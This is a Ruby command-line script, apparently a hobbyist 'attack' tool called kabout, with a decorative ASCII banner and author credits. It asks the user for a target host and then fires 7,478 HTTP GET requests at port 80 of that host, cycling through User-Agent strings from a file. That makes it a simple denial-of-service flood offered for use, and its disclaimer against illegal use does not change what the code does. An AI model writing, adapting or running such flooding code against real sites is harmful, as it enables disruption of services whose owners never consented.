#!/usr/bin/ruby
require 'net/http'
require 'colorize'
def banner(author, social1, social2, alert)
  system('clear')
  puts "
                                             _ ._  _ , _ ._
                                           (_ ' ( `  )_  .__)
                                         ( (  (    )   `)  ) _)
                                        (__ (_   (_ . _) _) ,__)
                                            `~~` ' . /`~~`
                                            ,::: ;   ; :::,
                                           ':::::::::::::::'".yellow.bold + "
                                      __________|_ __ |__________
                                     |                           |
                                     |          kabout           |
                                     |___________________________|
                                     ".light_red
                                     puts author
                                     puts social1
                                     puts social2
                                     puts alert
                                     puts "     "
end
banner("coded by ☼polarspetroll☼".light_cyan,
       "github : github.com/polarspetroll".light_green,
       "instagram : @polarspetroll".light_magenta,
       "⚠DO NOT USE THIS TOOL FOR ILLEGAL ACTIVITIES⚠".yellow.bold)
def loading(seconds,fps=8)
    chars = %w[| / - \\]
    delay = 0.7/fps
    (seconds*fps).round.times{ |i|
      print chars[i % chars.length].light_cyan.bold
      sleep delay
      print "\b"
    }
 end
print "target : ".green
@target = gets.chomp
@target.to_s
if @target == ""
  abort  "invalid target !".red.bold
elsif @target.include?("http") == true or @target.include?("https")
  abort  "please do not use http or https".light_yellow
end
def checkinginput
print "you target is".magenta +  " #{@target}".blue + " right?".magenta + "(Y/n)".yellow.bold
answer = gets.chomp
if answer == "Y" or answer == "y" or answer == ""
  banner("", "", "", "")
  print "attack is starting ".red.bold
  loading(3)
  puts ""
  banner("attacking the #{@target}".green.bold, "", "", "")
elsif answer == "N" or answer == "n"
  abort "run the script one more time and correct the input :)".light_green
else
  abort "invalid option for #{answer}"
end
end
checkinginput()
def requests
  http = Net::HTTP.new(@target, 80)
  getreq = Net::HTTP::Get.new("/", {'User-Agent' => @agent})
  http.request(getreq)
end

def agentreqs
  agentlist = File.open("agent.txt", "r")
  7478.times{
      @agent = agentlist.readline()
      requests()
      puts "request sent !".light_red.bold
    }
    puts "Done!".light_green.bold
end
agentreqs()
